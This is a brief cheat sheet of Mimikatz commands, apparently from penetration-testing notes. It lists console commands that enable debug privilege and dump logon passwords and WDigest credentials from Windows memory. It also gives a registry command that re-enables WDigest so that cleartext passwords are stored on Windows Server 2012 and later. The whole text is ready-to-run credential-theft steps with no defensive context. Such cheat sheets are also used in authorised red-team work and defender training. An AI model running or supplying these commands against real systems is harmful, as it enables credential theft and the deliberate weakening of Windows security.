# Table of commands Mimikatz

### Mimikatz console (multiple commands)
```
PS C:\temp\mimikatz> .\mimikatz
mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
```

### Extract passwords
```
mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest

# to re-enable wdigest in Windows Server 2012+
# in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest 
# create a DWORD 'UseLogonCredential' with the value 1.
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
```